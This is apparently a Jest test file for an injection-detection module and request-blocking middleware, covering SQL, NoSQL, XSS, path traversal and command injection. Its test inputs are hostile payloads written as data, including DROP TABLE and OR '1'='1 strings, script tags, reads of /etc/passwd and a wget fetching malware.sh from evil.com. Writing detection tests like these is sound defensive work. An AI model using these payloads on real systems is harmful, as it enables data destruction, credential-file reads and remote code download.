/**
 * Injection Detector 单元测试
 */

'use strict';

const InjectionDetector = require('../../../backend/shared/injectionDetector');
const { ATTACK_TYPES, SEVERITY_LEVELS, injectionProtectionMiddleware } = InjectionDetector;

describe('InjectionDetector', () => {
  let detector;

  beforeEach(() => {
    detector = new InjectionDetector();
  });

  describe('SQL Injection Detection', () => {
    test('should detect UNION SELECT injection', () => {
      const result = detector.detect("' UNION SELECT * FROM users--");
      expect(result.detected).toBe(true);
      expect(result.type).toBe(ATTACK_TYPES.SQL);
    });

    test('should detect DROP TABLE injection', () => {
      const result = detector.detect("'; DROP TABLE users;--");
      expect(result.detected).toBe(true);
      expect(result.severity).toBe(SEVERITY_LEVELS.CRITICAL);
    });

    test('should detect OR logic injection', () => {
      const result = detector.detect("' OR '1'='1");
      expect(result.detected).toBe(true);
      expect(result.type).toBe(ATTACK_TYPES.SQL);
    });

    test('should detect SQL comments', () => {
      const result = detector.detect('test--comment');
      expect(result.detected).toBe(true);
    });

    test('should detect stored procedure call', () => {
      const result = detector.detect('EXEC sp_help');
      expect(result.detected).toBe(true);
    });

    test('should not detect normal SQL keywords in safe context', () => {
      const result = detector.detect('The user selected a good option');
      expect(result.detected).toBe(false);
    });
  });

  describe('NoSQL Injection Detection', () => {
    test('should detect MongoDB $where injection', () => {
      const result = detector.detect('{$where: "this.password == \'admin\'"}');
      expect(result.detected).toBe(true);
      expect(result.type).toBe(ATTACK_TYPES.NOSQL);
      expect(result.severity).toBe(SEVERITY_LEVELS.CRITICAL);
    });

    test('should detect MongoDB operator injection', () => {
      const result = detector.detect('{$gt: ""}');
      expect(result.detected).toBe(true);
    });

    test('should detect JavaScript expression injection', () => {
      const result = detector.detect('function() { return this.field }');
      expect(result.detected).toBe(true);
    });

    test('should detect $eval injection', () => {
      const result = detector.detect('{$eval: "dangerous"}');
      expect(result.detected).toBe(true);
      expect(result.severity).toBe(SEVERITY_LEVELS.CRITICAL);
    });
  });

  describe('XSS Detection', () => {
    test('should detect script tag', () => {
      const result = detector.detect('<script>alert("XSS")</script>');
      expect(result.detected).toBe(true);
      expect(result.type).toBe(ATTACK_TYPES.XSS);
      expect(result.severity).toBe(SEVERITY_LEVELS.CRITICAL);
    });

    test('should detect javascript: protocol', () => {
      const result = detector.detect('javascript:alert(1)');
      expect(result.detected).toBe(true);
    });

    test('should detect event handler', () => {
      const result = detector.detect('<img onerror="alert(1)" src="x">');
      expect(result.detected).toBe(true);
    });

    test('should detect iframe tag', () => {
      const result = detector.detect('<iframe src="evil.com"></iframe>');
      expect(result.detected).toBe(true);
    });

    test('should detect HTML entity encoding', () => {
      const result = detector.detect('&#x3C;script&#x3E;');
      expect(result.detected).toBe(true);
    });

    test('should detect data: URI', () => {
      const result = detector.detect('data:text/html,<script>alert(1)</script>');
      expect(result.detected).toBe(true);
    });

    test('should not detect safe HTML', () => {
      const result = detector.detect('<p>Hello World</p>');
      // Low severity, but might still be detected depending on strictness
      // This tests the detector with normal content
    });
  });

  describe('Path Traversal Detection', () => {
    test('should detect ../ traversal', () => {
      const result = detector.detect('../../../etc/passwd');
      expect(result.detected).toBe(true);
      expect(result.type).toBe(ATTACK_TYPES.PATH_TRAVERSAL);
    });

    test('should detect URL encoded traversal', () => {
      const result = detector.detect('%2e%2e%2f%2e%2e%2fetc/passwd');
      expect(result.detected).toBe(true);
    });

    test('should detect absolute path', () => {
      const result = detector.detect('/etc/passwd');
      expect(result.detected).toBe(true);
    });

    test('should not detect normal file path', () => {
      const result = detector.detect('documents/report.pdf');
      expect(result.detected).toBe(false);
    });
  });

  describe('Command Injection Detection', () => {
    test('should detect pipe command', () => {
      const result = detector.detect('test | cat /etc/passwd');
      expect(result.detected).toBe(true);
      expect(result.type).toBe(ATTACK_TYPES.COMMAND_INJECTION);
    });

    test('should detect semicolon command', () => {
      const result = detector.detect('test; ls -la');
      expect(result.detected).toBe(true);
    });

    test('should detect backtick execution', () => {
      const result = detector.detect('test `whoami`');
      expect(result.detected).toBe(true);
    });

    test('should detect shell keywords', () => {
      const result = detector.detect('wget http://evil.com/malware.sh');
      expect(result.detected).toBe(true);
    });

    test('should detect $() command substitution', () => {
      const result = detector.detect('$(cat /etc/passwd)');
      expect(result.detected).toBe(true);
    });
  });

  describe('Configuration Options', () => {
    test('should respect enabledAttacks option', () => {
      const sqlOnlyDetector = new InjectionDetector({
        enabledAttacks: [ATTACK_TYPES.SQL]
      });

      const xssResult = sqlOnlyDetector.detect('<script>alert(1)</script>');
      expect(xssResult.detected).toBe(false);

      const sqlResult = sqlOnlyDetector.detect("' OR '1'='1");
      expect(sqlResult.detected).toBe(true);
    });

    test('should respect strictness option', () => {
      const lowStrictDetector = new InjectionDetector({
        strictness: 'low'
      });

      // Low strictness should only report medium+ severity
      const lowResult = lowStrictDetector.detect('test comment # here');
      expect(lowResult.detected).toBe(false);
    });

    test('should respect whiteList option', () => {
      const detectorWithWhiteList = new InjectionDetector({
        whiteList: { 'body.description': true }
      });

      const result = detectorWithWhiteList.detect('<script>alert(1)</script>', 'body.description');
      expect(result.detected).toBe(false);
    });
  });

  describe('Stats Tracking', () => {
    test('should track detection stats', () => {
      detector.detect("' OR '1'='1");
      detector.detect('<script>alert(1)</script>');
      detector.detect('normal text');

      const stats = detector.getStats();
      expect(stats.totalChecks).toBe(3);
      expect(stats.detections).toBe(2);
      expect(stats.byType[ATTACK_TYPES.SQL]).toBe(1);
      expect(stats.byType[ATTACK_TYPES.XSS]).toBe(1);
    });

    test('should reset stats', () => {
      detector.detect("' OR '1'='1");
      detector.resetStats();

      const stats = detector.getStats();
      expect(stats.totalChecks).toBe(0);
      expect(stats.detections).toBe(0);
    });
  });

  describe('Custom Patterns', () => {
    test('should add custom pattern', () => {
      detector.addPattern('custom', {
        pattern: /CUSTOM_ATTACK/i,
        severity: SEVERITY_LEVELS.HIGH,
        description: 'Custom attack detected'
      });

      const result = detector.detect('CUSTOM_ATTACK payload');
      expect(result.detected).toBe(true);
    });

    test('should support custom patterns in constructor', () => {
      const customDetector = new InjectionDetector({
        customPatterns: [/CUSTOM_PATTERN/i]
      });

      const result = customDetector.detect('CUSTOM_PATTERN found');
      expect(result.detected).toBe(true);
    });
  });

  describe('detectInObject', () => {
    test('should detect injection in nested object', () => {
      const obj = {
        user: {
          name: 'John',
          query: "' OR '1'='1"
        },
        tags: ['<script>alert(1)</script>', 'safe']
      };

      const detections = detector.detectInObject(obj);
      expect(detections.length).toBe(2);
    });

    test('should handle arrays correctly', () => {
      const obj = {
        items: ['safe', "' UNION SELECT", 'also safe']
      };

      const detections = detector.detectInObject(obj);
      expect(detections.length).toBe(1);
      expect(detections[0].field).toBe('items[1]');
    });

    test('should return empty array for clean object', () => {
      const obj = {
        name: 'John',
        email: 'john@example.com',
        age: 30
      };

      const detections = detector.detectInObject(obj);
      expect(detections.length).toBe(0);
    });
  });

  describe('injectionProtectionMiddleware', () => {
    let mockReq, mockRes, mockNext;

    beforeEach(() => {
      mockReq = {
        body: {},
        query: {},
        params: {},
        headers: { 'x-request-id': 'req-test' },
        method: 'POST',
        path: '/test'
      };
      mockRes = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn().mockReturnThis()
      };
      mockNext = jest.fn();
    });

    test('should pass clean request', () => {
      const middleware = injectionProtectionMiddleware();
      mockReq.body = { name: 'John', email: 'john@example.com' };

      middleware(mockReq, mockRes, mockNext);

      expect(mockNext).toHaveBeenCalled();
      expect(mockRes.status).not.toHaveBeenCalled();
    });

    test('should block high severity injection', () => {
      const middleware = injectionProtectionMiddleware();
      mockReq.body = { query: "' OR '1'='1" };

      middleware(mockReq, mockRes, mockNext);

      expect(mockRes.status).toHaveBeenCalledWith(400);
      expect(mockNext).not.toHaveBeenCalled();
    });

    test('should detect injection in query params', () => {
      const middleware = injectionProtectionMiddleware();
      mockReq.query = { search: '<script>alert(1)</script>' };

      middleware(mockReq, mockRes, mockNext);

      expect(mockRes.status).toHaveBeenCalledWith(400);
    });

    test('should respect blockLevel option', () => {
      const middleware = injectionProtectionMiddleware({ blockLevel: 'all' });
      mockReq.body = { comment: 'This has # in it' };

      middleware(mockReq, mockRes, mockNext);

      // With blockLevel: 'all', even low severity is blocked
      expect(mockRes.status).toHaveBeenCalled();
    });
  });

  describe('Performance', () => {
    test('should handle large strings efficiently', () => {
      const largeString = 'normal text '.repeat(1000) + "' OR '1'='1";
      
      const start = Date.now();
      const result = detector.detect(largeString);
      const duration = Date.now() - start;

      expect(result.detected).toBe(true);
      expect(duration).toBeLessThan(50); // Should complete in < 50ms
    });

    test('should handle multiple checks efficiently', () => {
      const payloads = [
        'normal text',
        'another normal text',
        'yet another normal',
        "' OR '1'='1",
        '<script>alert(1)</script>'
      ];

      const start = Date.now();
      payloads.forEach(p => detector.detect(p));
      const duration = Date.now() - start;

      expect(duration).toBeLessThan(20);
    });
  });
});
